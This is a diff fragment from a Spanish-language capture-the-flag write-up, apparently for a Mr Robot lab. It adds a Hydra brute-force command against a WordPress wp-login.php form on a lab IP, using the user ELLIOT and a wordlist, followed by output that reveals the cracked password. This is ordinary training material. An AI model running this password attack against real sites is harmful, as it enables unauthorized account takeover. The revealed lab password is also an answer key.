@@ -106,3 +106,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-25 23:02:
 [STATUS] 1028.86 tries/min, 7202 tries in 00:07h, 4250 to do in 00:05h, 30 active
 
 ```
+Una vez detectado el usuario Eliot procederemos a lanzar el ataque de fuerza bruta contra la contraseña, hemos de tener en cuenta el campo F que detectara si las contraseñas probadas son incorrectas 
+```bash
+└─$ hydra -I -l ELLIOT -P fsocity_clean.dic 10.10.170.170 https-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submitLog%20In&testcookie=1:F=is incorrect" -t30                             
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-29 16:00:37
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 30 tasks per 1 server, overall 30 tasks, 11452 login tries (l:1/p:11452), ~382 tries per task
+[DATA] attacking http-post-forms://10.10.170.170:443/wp-login.php:log=^USER^&pwd=^PASS^&wp-submitLog%20In&testcookie=1:F=is incorrect
+
+[STATUS] 2322.00 tries/min, 2322 tries in 00:01h, 9130 to do in 00:04h, 30 active
+[443][http-post-form] host: 10.10.170.170   login: ELLIOT   password: ER28-0652
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-29 16:03:07
+```
